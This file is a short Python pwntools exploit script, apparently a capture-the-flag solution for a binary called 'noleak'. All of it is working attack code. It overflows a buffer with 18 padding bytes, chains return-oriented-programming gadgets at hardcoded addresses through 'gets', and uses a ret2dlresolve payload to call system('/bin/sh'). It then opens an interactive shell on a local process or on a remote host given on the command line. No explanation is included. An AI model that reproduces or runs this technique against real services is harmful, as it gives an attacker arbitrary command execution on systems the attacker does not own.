#!/usr/bin/env python3

from pwn import *

context.binary = 'noleak'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


p = get_process()

dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])

pop_rax_ret_addr = 0x40115e
mov_rdi_rax_ret_addr = 0x401160
ret_addr = 0x40101a

raw_rop  = p64(pop_rax_ret_addr)
raw_rop += p64(0x404e00)
raw_rop += p64(mov_rdi_rax_ret_addr)
raw_rop += p64(context.binary.plt.gets)
raw_rop += p64(ret_addr)
raw_rop += p64(pop_rax_ret_addr)
raw_rop += p64(0x404e38)
raw_rop += p64(mov_rdi_rax_ret_addr)
raw_rop += p64(0x401020)
raw_rop += p64(0x304)

p.sendline(b'A' * 18 + raw_rop)
p.sendline(dlresolve.payload)

p.interactive()